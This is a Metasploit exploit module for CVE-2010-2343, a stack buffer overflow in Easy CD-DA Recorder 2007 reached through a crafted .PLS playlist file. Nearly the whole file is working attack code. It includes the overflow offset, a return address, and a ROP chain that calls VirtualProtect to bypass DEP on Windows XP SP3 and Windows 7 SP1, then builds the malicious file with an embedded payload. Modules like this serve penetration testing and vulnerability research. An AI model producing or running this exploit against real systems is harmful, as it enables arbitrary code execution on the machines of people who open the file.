 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Easy CD-DA Recorder PLS Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack-based buffer overflow vulnerability in
        Easy CD-DA Recorder 2007, caused by a long string in a playlist entry.
        By persuading the victim to open a specially-crafted .PLS file, a
        remote attacker could execute arbitrary code on the system or cause
        the application to crash. This module has been tested successfully on
        Windows XP SP3 and Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;chap0&#039;,        # Vulnerability discovery and original exploit
          &#039;Gabor Seljan&#039;, # Metasploit module
          &#039;juan vazquez&#039;  # Improved reliability
        ],
      &#039;References&#039;     =>
        [
          [ &#039;BID&#039;, &#039;40631&#039; ],
          [ &#039;EDB&#039;, &#039;13761&#039; ],
          [ &#039;OSVDB&#039;, &#039;65256&#039; ],
          [ &#039;CVE&#039;, &#039;2010-2343&#039; ],
          [ &#039;URL&#039;, &#039;http://www.corelan.be:8800/advisories.php?id=CORELAN-10-048&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;process&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039;    => true,
          &#039;BadChars&#039;       => "\x0a\x3d",
          &#039;Space&#039;          => 2454,
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff"  # ADD ESP,-3500
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows XP SP3 / Windows 7 SP1 (DEP Bypass)&#039;,
            # easycdda.exe 3.0.114.0
            # audconv.dll 7.0.815.0
            {
              &#039;Offset&#039; => 1108,
              &#039;Ret&#039;    => 0x1001b19b  # ADD ESP,0C10 # RETN 0x04 [audconv.dll]
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jun 7 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.pls&#039;])
        ],
      self.class)
 
  end
 
  def nops
    return make_nops(4).unpack("V").first
  end
 
  def rop_nops(n = 1)
    # RETN (ROP NOP) [audconv.dll]
    [0x1003d55d].pack(&#039;V&#039;) * n
  end
 
  def exploit
 
    # ROP chain generated by mona.py - See corelan.be
    rop_gadgets =
    [
      0x1007261e,  # POP EDX # RETN [audconv.dll]
      0x0042a0e0,  # &VirtualProtect() [IAT easycdda.exe]
      0x1003bd6b,  # MOV EAX,DWORD PTR DS:[EDX] # RETN [audconv.dll]
      0x10035802,  # XCHG EAX,ESI # RETN [audconv.dll]
      0x1005d288,  # POP EBP # RETN [audconv.dll]
      0x004030c8,  # &PUSH ESP # RET 0x08 [easycdda.exe]
      0x1005cc2d,  # POP EBX # RETN [audconv.dll]
      0x00000996,  # 0x00000996-> EBX
      0x1008740c,  # POP EDX # RETN [audconv.dll]
      0x00000040,  # 0x00000040-> EDX
      0x1001826d,  # POP ECX # RETN [audconv.dll]
      0x004364c6,  # &Writable location [easycdda.exe]
      0x00404aa9,  # POP EDI # RETN [easycdda.exe]
      0x100378e6,  # RETN (ROP NOP) [audconv.dll]
      0x0042527d,  # POP EAX # RETN [easycdda.exe]
      nops,
      0x00429692   # PUSHAD # INC EBX # ADD CL,CH # RETN [easycdda.exe]
    ].flatten.pack(&#039;V*&#039;)
 
    sploit =  rop_nops(target[&#039;Offset&#039;] / 4)
    sploit << [0x1003d55c].pack("V") # pop edi # ret [audconv.dll]
    sploit << [target.ret].pack("V")
    sploit << rop_nops(22)
    sploit << rop_gadgets
    sploit << payload.encoded
    sploit << rand_text_alpha_upper(10000) # Generate exception
 
    # Create the file
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(sploit)
 
  end
end

